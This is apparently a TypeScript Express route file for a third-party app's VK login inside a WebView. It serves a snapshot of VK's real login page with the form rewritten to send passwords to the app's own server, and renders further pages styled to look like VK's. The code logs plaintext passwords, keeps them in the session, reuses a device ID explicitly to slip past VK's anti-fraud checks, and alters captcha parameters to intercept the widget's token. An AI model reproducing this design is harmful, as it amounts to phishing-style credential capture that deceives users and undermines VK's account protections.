import {vkTokenAncor} from "@/configurations"
import {deviceIDgen} from "@/helper"
import {performDirectGrant, requestValidationResend} from "@/helper/directGrant"
import {Request, Response} from "@/types"
import express from "express"
import fs, {readFileSync} from "fs"
import path from "path"

export const authForm = express.Router()

/**
 * VK audio auth is served to the app inside a WebView pointed at /auth/vk.
 * Two strategies share one WebView (app catches the final blank.html#... hash):
 *
 *  1. RELAY OAUTH (primary) — GET /auth/vk 302-redirects the WebView to VK's
 *     genuine oauth.vk.com/authorize page. The user logs in on VK's REAL page,
 *     so 2FA (SMS) and the human-check captcha work natively. On success VK
 *     redirects to oauth.vk.com/blank.html#access_token=... (no `secret`). The
 *     app then POSTs that URL to /api/auth/token, which upgrades it to a
 *     token+secret via auth.refreshToken. Interactive login → no flood control.
 *
 *  2. HYBRID FALLBACK — /auth/vk/fallback serves a backend login form that
 *     drives the direct password grant (the only path that returns an
 *     audio-capable secret directly). 2FA/captcha challenges are rendered as
 *     backend HTML steps inside the same WebView. Used when VK forces VK ID on
 *     the authorize page (no audio token there).
 */

// ---- direct grant driven through backend HTML pages inside the WebView ------
//
// The WebView shows VK's REAL login page (docs/auth.html snapshot) with its form
// action rewritten to POST here; the password is captured for the direct grant.
//
// NOTE: relay OAuth (302 to the live oauth.vk.com/authorize page) was tried and
// abandoned 2026-08-22. In a real browser that authorize URL redirects to VK ID
// (id.vk.ru), whose token (`vk1.a...`) has NO audio access (audio.get -> "Unknown
// method") and cannot be upgraded to an audio secret. OAuth never hands us the
// password, so it can't feed the direct grant. Serving VK's login markup and
// capturing the password ourselves is the only way to get the real-page look AND
// an audio-capable token.

// Rewrite VK's saved login page so its form POSTs to our grant endpoint, and
// neutralise the snapshot's self-reloading / event-blocking scripts.
const rewriteVkForm = (html: string, action: string, error?: string): string => {
  html = html.replace(/,window._preventEvents=\["click","touchstart","touchend","mouseover","mousemove"\]/gi, "")
  html = html.replace(/&&location\.reload\(\)/gi, "")
  html = html.replace(/<form[^>]*>/gi, `<form method="post" action="${action}">`)
  if (error) {
    const banner = `<div style="background:#fc3c44;color:#fff;padding:12px 16px;text-align:center;font:14px -apple-system,sans-serif">${error}</div>`
    html = html.replace(/<body[^>]*>/i, (m) => `${m}${banner}`)
  }
  return html
}

const serveVkLoginPage = (res: Response, error?: string): boolean => {
  const p = path.resolve(process.cwd(), "docs/auth.html")
  if (!fs.existsSync(p)) {
    console.error("❌ docs/auth.html not found at:", p)
    return false
  }
  const file = readFileSync(p, "utf-8")
  res.setHeader("Content-Type", "text/html; charset=utf-8")
  res.send(rewriteVkForm(file, "/auth/vk", error)).end()
  return true
}

// VK-styled shell for the pages we render ourselves (2FA, captcha fallback,
// errors). It deliberately mirrors the look of VK's own mobile login page —
// light grey backdrop, white card, VK logo, blue primary button — so the flow
// does not jump from VK's page into an unrelated black screen.
//
// Everything is inline: no external CSS/JS. VK's real page pulls ~11 stylesheets
// and 34 bundles from st*.vk.com, which older WebViews fail to load, and we must
// not repeat that here.
//
// The card sits at the TOP, not vertically centred: on a phone the on-screen
// keyboard covers the lower half, and a centred card pushes the submit button
// under it so taps land on the keyboard instead.
const PAGE = (inner: string) => `<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>VK</title>
<style>
  :root { color-scheme: light; }
  * { box-sizing: border-box; }
  body { margin:0; background:#edeef0; color:#000;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
         min-height:100vh; display:flex; align-items:flex-start; justify-content:center; padding:24px 12px; }
  .card { width:100%; max-width:360px; background:#fff; border-radius:12px; padding:24px 20px 20px; }
  .logo { display:block; margin:0 auto 16px; width:44px; height:44px; border-radius:10px; background:#07f;
          color:#fff; font-weight:700; font-size:19px; line-height:44px; text-align:center; letter-spacing:-.5px; }
  h1 { font-size:17px; font-weight:500; margin:0 0 4px; text-align:center; color:#000; }
  .hint { color:#818c99; font-size:14px; line-height:19px; margin:0 0 16px; text-align:center; }
  label { display:block; color:#818c99; font-size:13px; margin:0 0 6px; }
  input { width:100%; background:#f2f3f5; color:#000; border:1px solid transparent; border-radius:10px;
          padding:13px 14px; font-size:16px; margin-bottom:14px; }
  input:focus { outline:none; border-color:#3f8ae0; background:#fff; }
  button { width:100%; background:#3f8ae0; color:#fff; border:0; border-radius:10px; padding:14px;
           font-size:15px; font-weight:500; }
  button:active { background:#3576c0; }
  button[disabled] { background:#c4c8cc; }
  .err { background:#fdecec; color:#e64646; font-size:14px; border-radius:8px; padding:10px 12px; margin:0 0 14px; }
  .ok { background:#eaf4ff; color:#3f8ae0; font-size:14px; border-radius:8px; padding:10px 12px; margin:0 0 14px; }
  .captcha { width:100%; border-radius:8px; margin-bottom:14px; }
  a { color:#3f8ae0; font-size:14px; display:block; text-align:center; margin-top:14px; text-decoration:none; }
</style></head><body><div class="card"><div class="logo">VK</div>${inner}</div></body></html>`

const loginForm = (error?: string, action: string = "/auth/vk") => PAGE(`
  <h1>Вход</h1>
  <p class="hint">Введите данные аккаунта VK</p>
  ${error ? `<p class="err">${error}</p>` : ""}
  <form method="post" action="${action}">
    <label>Телефон или email</label>
    <input name="email" type="text" inputmode="email" autocapitalize="none" autocorrect="off" autofocus>
    <label>Пароль</label>
    <input name="pass" type="password" enterkeyhint="go">
    <button type="submit">Войти</button>
  </form>`)

// Wording for every 2FA channel VK can pick. This matters: for `2fa_callreset`
// VK places a FLASH CALL and the code is the last 4 digits of the CALLING
// number — no SMS is ever sent, so a "введите код из SMS" prompt leaves the user
// waiting for a message that will never arrive.
const validationCopy = (type?: string): {title: string; hint: string; len: number} => {
  switch (type) {
    case "2fa_callreset":
    case "callreset":
      return {
        title: "Подтверждение входа",
        hint: "Сейчас поступит звонок. Введите последние 4 цифры номера, с которого звонят — отвечать не нужно.",
        len: 4,
      }
    case "2fa_app":
      return {title: "Код из приложения", hint: "Введите код из приложения-аутентификатора.", len: 6}
    case "2fa_sms":
      return {title: "Код из SMS", hint: "Введите код из SMS.", len: 6}
    default:
      return {title: "Подтверждение входа", hint: "Введите код подтверждения.", len: 6}
  }
}

type ValState = {sid?: string; type?: string; mask?: string; resend?: string}

const smsForm = (v: ValState, notice?: string, delay?: number) => {
  const c = validationCopy(v.type)
  // VK returns `delay` seconds before it will actually re-deliver; asking sooner
  // just returns the same countdown, so keep the button disabled until then.
  const wait = typeof delay === "number" && delay > 0 ? delay : 0
  const canResend = !!v.sid && !!v.resend
  return PAGE(`
  <h1>${c.title}</h1>
  <p class="hint">${c.hint}${v.mask ? `<br>${v.mask}` : ""}</p>
  ${notice ? `<p class="ok">${notice}</p>` : ""}
  <form method="post" action="/auth/vk">
    <label>Код</label>
    <input name="code" type="text" inputmode="numeric" autocomplete="one-time-code"
           maxlength="${c.len}" placeholder="${"•".repeat(c.len)}" autofocus>
    <button type="submit">Подтвердить</button>
  </form>
  ${canResend ? `<a id="rs" href="/auth/vk/validate-resend">Запросить код повторно${v.resend === "sms" ? " по SMS" : ""}</a>
  <script>
    (function(){
      var left = ${wait}, a = document.getElementById('rs'), t = a.textContent;
      if (!left) return;
      a.style.color = '#818c99';
      a.removeAttribute('href');
      var tick = function(){
        a.textContent = left > 0 ? t + ' (' + left + ')' : t;
        if (left-- <= 0) { a.href = '/auth/vk/validate-resend'; a.style.color = '#3f8ae0'; return; }
        setTimeout(tick, 1000);
      };
      tick();
    })();
  </script>` : ""}
  <a href="/auth/vk?reset=1">Начать заново</a>`)
}

const captchaForm = (captchaImg: string, captchaSid: string) => PAGE(`
  <h1>Подтвердите, что вы не робот</h1>
  <p class="hint">Введите символы с картинки</p>
  <img class="captcha" src="${captchaImg}" alt="captcha">
  <form method="post" action="/auth/vk">
    <input type="hidden" name="captcha_sid" value="${captchaSid}">
    <input name="captcha_key" type="text" autocapitalize="none" autocorrect="off" autofocus>
    <button type="submit">Подтвердить</button>
  </form>
  <a href="/auth/vk?reset=1">Начать заново</a>`)

type FbState = {login: string; password: string; device_id: string; captcha_sid?: string; captcha_redirect?: string}

const html = (res: Response, body: string) => {
  res.setHeader("Content-Type", "text/html; charset=utf-8")
  res.send(body).end()
}

// Turn a grant result into the right WebView response, shared by the initial
// POST and the post-captcha /resume. On success -> blank.html#... (app catches
// the hash). On need_captcha -> redirect the WebView to VK's REAL interactive
// captcha (redirect_uri); the snapshot image captcha is dead for api-oauth. With
// &blank=1 VK navigates to oauth.vk.com/blank.html?success=1 after the user
// solves it, which the app catches and calls /auth/vk/resume to finish the grant.
const finalizeGrant = (req: Request, res: Response, result: any): void => {
  if (result.kind === "ok") {
    delete (req.session as any).fb
    req.session.access_token = result.access_token
    req.session.secret = result.secret
    req.session.user_id = result.user_id
    req.session.device_id = result.device_id
    console.log("✅ grant ok:", {user_id: result.user_id, has_secret: !!result.secret})
    res.redirect(
      `blank.html#success=1&access_token=${result.access_token}` +
      `&user_id=${result.user_id}&secret=${result.secret}&device_id=${result.device_id}`
    )
    return
  }

  if (result.kind === "need_validation") {
    console.warn("🔐 2FA required", {
      type: result.validation_type,
      resend: result.validation_resend,
      vk_says: result.description,
    })
    // Keep the challenge details around so /validate-resend can ask VK to send
    // the code again (and so the form keeps showing the right instructions).
    const val: ValState = {
      sid: result.validation_sid,
      type: result.validation_type,
      mask: result.phone_mask,
      resend: result.validation_resend,
    }
    ;(req.session as any).val = val
    html(res, smsForm(val))
    return
  }

  if (result.kind === "need_captcha") {
    console.warn("🧩 captcha required; redirect_uri?", !!result.redirect_uri)
    // Remember captcha_sid + the VK captcha URL so /captcha can host it and
    // /resume can redeem the same challenge.
    const fb = (req.session as any).fb as FbState | undefined
    if (fb) {
      fb.captcha_sid = result.captcha_sid
      fb.captcha_redirect = result.redirect_uri
    }
    if (result.redirect_uri) {
      // Send the WebView top-level to VK's real captcha (VK forbids framing it,
      // so no iframe). Append two params:
      //  &origin=<host>  — the widget only emits its result via postMessage when
      //     config.origin is truthy (bundle: `this.config.origin && window.parent
      //     .postMessage(...)`, origin read from the `origin` query param). The
      //     app's injected window.postMessage wrapper captures that call (the
      //     success_token) regardless of the targetOrigin the browser would drop.
      //  &redirect=1     — sets isOldClient so a solved captcha navigates to
      //     blank.html?success=1 instead of hanging on the bridge sendCloseEvent.
      // origin=https://id.vk.com: the widget posts its result to window.parent
      // with this as targetOrigin. Since the captcha runs top-level in the
      // WebView (window.parent===window, origin id.vk.com), matching it to
      // id.vk.com means the browser actually DELIVERS the message to a top-level
      // 'message' listener (our injected addEventListener), not just to the
      // postMessage-call wrapper. Belt and suspenders for the app capture.
      const sep = result.redirect_uri.includes("?") ? "&" : "?"
      const url = `${result.redirect_uri}${sep}origin=${encodeURIComponent("https://id.vk.com")}&redirect=1`
      res.redirect(url)
      return
    }
    // Fallback (no redirect_uri): the legacy image page (usually broken now).
    html(res, captchaForm(result.captcha_img, result.captcha_sid))
    return
  }

  console.error("❌ grant failed:", result.message)
  delete (req.session as any).fb
  serveLoginError(req, res, result.message)
}

// GET /vk: show VK's real login page (falls back to the clean form if the
// snapshot is missing). GET /vk/fallback: the clean built-in form.
// ?reset=1 clears any in-progress challenge state.
authForm.get("/vk", async (req: Request, res: Response) => {
  if (req.query.reset) delete (req.session as any).fb
  // The app passes its stable, real device_id (persisted in SecureStore). A
  // consistent device_id across grant + audio signing looks like one real
  // device to VK's anti-fraud (a new random id every attempt reads as many
  // devices and escalates to captcha faster). Stored for the POST/resume below.
  if (req.query.device_id) (req.session as any).dev = String(req.query.device_id)
  if (!serveVkLoginPage(res)) html(res, loginForm())
})

authForm.get("/vk/fallback", async (req: Request, res: Response) => {
  if (req.query.reset) delete (req.session as any).fb
  html(res, loginForm(undefined, "/auth/vk/fallback"))
})

// Re-render the login page with an error — real VK page for /vk, clean form for
// the fallback path.
const serveLoginError = (req: Request, res: Response, message: string) => {
  const action = req.path.includes("/fallback") ? "/auth/vk/fallback" : "/auth/vk"
  if (action === "/auth/vk" && serveVkLoginPage(res, message)) return
  html(res, loginForm(message, action))
}

// POST: run one direct-grant attempt, render the next step in the WebView
authForm.post(["/vk", "/vk/fallback"], async (req: Request, res: Response) => {
  const prev = (req.session as any).fb as FbState | undefined

  // Initial submit carries email/pass; challenge submits reuse stored creds.
  const login = req.body.email || prev?.login
  const password = req.body.pass || prev?.password
  // Prefer the app's real device_id (from GET ?device_id=), then a stable one
  // from a prior step, then a fresh fallback.
  const device_id = prev?.device_id || (req.session as any).dev || deviceIDgen()

  if (!login || !password) {
    serveLoginError(req, res, "Введите логин и пароль")
    return
  }

  // DEV debug: show which credentials are being used to sign in and whether this
  // is an initial attempt or a challenge (2FA code / captcha) resubmit.
  console.log("=====> /auth" + req.path + " attempt:", {
    login,
    password,
    code: req.body.code || undefined,
    captcha_key: req.body.captcha_key || undefined,
    device_id,
  })

  // Persist creds + device_id BEFORE the attempt so a challenge (captcha/2FA)
  // can resume the grant with the SAME device_id. finalizeGrant clears fb on ok.
  ;(req.session as any).fb = {login, password, device_id} as FbState

  try {
    const result = await performDirectGrant({
      login,
      password,
      device_id,
      code: req.body.code,
      captcha_sid: req.body.captcha_sid,
      captcha_key: req.body.captcha_key,
    })
    finalizeGrant(req, res, result)
  } catch (error: any) {
    console.error("======> grant ERROR:", error?.message)
    serveLoginError(req, res, error?.message || "Ошибка авторизации")
  }
})

// After the user solves VK's real captcha, VK navigates the WebView to
// oauth.vk.com/blank.html?success=1 (no token). The app catches that and loads
// this endpoint, which retries the SAME grant (same device_id) — VK has cleared
// the not_robot flag for this session/device, so the token is now issued.
authForm.get(["/vk/resume", "/vk/fallback/resume"], async (req: Request, res: Response) => {
  const prev = (req.session as any).fb as FbState | undefined
  if (!prev?.login || !prev?.password) {
    console.warn("⚠️ /resume without session creds")
    serveLoginError(req, res, "Сессия истекла. Войдите заново.")
    return
  }
  // The app captures the not_robot `success_token` from the captcha widget
  // (captchaNotRobot.check response / bridge postMessage) and passes it here.
  // VK redeems it on the token endpoint with the ORIGINAL captcha_sid +
  // `success_token` (NOT captcha_key). Proven 2026-08-23:
  //   captcha_sid + success_token -> access_token + secret.
  // Accept success_token (preferred) or the legacy captcha_key query for compat.
  const success_token = req.query.success_token
    ? String(req.query.success_token)
    : req.query.captcha_key
      ? String(req.query.captcha_key)
      : undefined
  console.log("=====> /auth" + req.path + " (post-captcha resume):", {
    login: prev.login,
    device_id: prev.device_id,
    captcha_sid: prev.captcha_sid,
    has_success_token: !!success_token,
  })
  try {
    const result = await performDirectGrant({
      login: prev.login,
      password: prev.password,
      device_id: prev.device_id,
      captcha_sid: success_token ? prev.captcha_sid : undefined,
      success_token,
    })
    finalizeGrant(req, res, result)
  } catch (error: any) {
    console.error("======> resume grant ERROR:", error?.message)
    serveLoginError(req, res, error?.message || "Ошибка авторизации")
  }
})

// Ask VK to re-deliver the 2FA code (e.g. switch a flash call over to SMS).
// VK enforces its own countdown: calling early just returns the remaining
// `delay`, which we render as a disabled link with a timer.
authForm.get("/vk/validate-resend", async (req: Request, res: Response) => {
  const val = (req.session as any).val as ValState | undefined
  if (!val?.sid) {
    serveLoginError(req, res, "Сессия истекла. Войдите заново.")
    return
  }
  const r = await requestValidationResend(val.sid)
  if (r.validation_type) val.type = `2fa_${r.validation_type}`.replace("2fa_2fa_", "2fa_")
  if (r.validation_resend) val.resend = r.validation_resend
  ;(req.session as any).val = val
  const notice = r.error
    ? undefined
    : r.delay
      ? `Код можно запросить снова через ${r.delay} с.`
      : "Код отправлен повторно."
  html(res, smsForm(val, notice ?? `Не удалось запросить код: ${r.error}`, r.delay))
})

authForm.get('/blank.html', async (req: Request, res: Response) => {
  res.setHeader('Content-Type', 'text/html; charset="utf-8"')
  res.send("<html><body></body></html>").end()
  return;
})

// - ########################################## test-mock (dev)
// Offline dev flow: WebView loads /auth/local, submitting redirects to
// blank.html with a canned token anchor (DEV_API_TOKEN) so the app-side
// hash-capture can be exercised without hitting VK.
authForm.get('/local', async (req: Request, res: Response) => {
  html(res, loginForm(undefined, "/auth/local"))
})

authForm.post('/local', async (req: Request, res: Response) => {
  console.log("===Local post", req.body)
  console.log("redirect blank.html" + vkTokenAncor)
  res.redirect("blank.html" + vkTokenAncor)
})
